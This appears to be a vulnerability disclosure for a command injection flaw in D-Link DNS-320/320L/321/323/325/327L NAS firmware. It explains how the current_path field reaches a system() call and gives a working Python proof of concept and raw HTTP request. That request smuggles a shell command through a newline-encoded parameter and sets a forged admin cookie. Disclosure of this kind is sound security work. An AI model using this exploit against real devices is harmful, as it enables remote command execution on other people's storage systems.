# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)

# Affected version
DLINK DNS-320/320L/321/323/325/327L  all firmware version
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_del_photo function of the file /cgi-bin/photocenter_mgr.cgi.  The variable `current_path` is passed from a POST request and is assigned to `v6` via the `sprintf` function at line 29. It is then passed into `v5` and invoked by the `system` command,  the `SpecSymbol2BackSlash` function did not work  which leads to command execution. ![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723392625581-d85c7a6a-a8fd-4331-a6ab-5ff62b367c3a.png#averageHue=%23fdfdfc&clientId=u7ce054dc-824f-4&from=paste&height=320&id=ud7cba5fe&originHeight=504&originWidth=923&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=52285&status=done&style=none&taskId=uc65e17c8-0192-4770-b6fe-ffb619f4649&title=&width=585.5555419921875)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/photocenter_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_del_photo&current_path=%0atouch%09/tmp/555%0a&photo_name=/tmp/111&move_from=/tmp/333&rp=10&page=10&r=10&date=19&album_name=/tmp/"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/photocenter_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Referer: http://192.168.0.32/photo_center/index.html
Cookie: username=admin
Priority: u=1

cmd=cgi_del_photo&current_path=%0atouch%09/tmp/555%0a&photo_name=/tmp/111&move_from=/tmp/333&rp=10&page=10&r=10&date=19&album_name=/tmp/
```


